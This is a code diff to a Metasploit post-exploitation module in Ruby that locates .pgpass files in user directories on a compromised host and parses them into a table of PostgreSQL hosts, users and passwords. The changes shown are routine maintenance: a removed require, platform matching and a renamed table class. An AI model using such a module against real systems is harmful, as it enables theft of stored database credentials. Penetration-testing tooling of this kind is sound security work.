@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
@@ -30,9 +28,9 @@ class MetasploitModule < Msf::Post
 
     files = []
     case session.platform
-    when /unix|linux|bsd|osx/
+    when 'unix', 'linux', 'bsd', 'osx'
       files = enum_user_directories.map {|d| d + "/.pgpass"}.select { |f| file?(f) }
-    when /win/
+    when 'windows'
       if session.type != "meterpreter"
         print_error("Only meterpreter sessions are supported on windows hosts")
         return
@@ -66,7 +64,7 @@ class MetasploitModule < Msf::Post
 
   # Store the creds to
   def parse_creds(f)
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'Postgres Data',
       'Indent'  => 1,
       'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
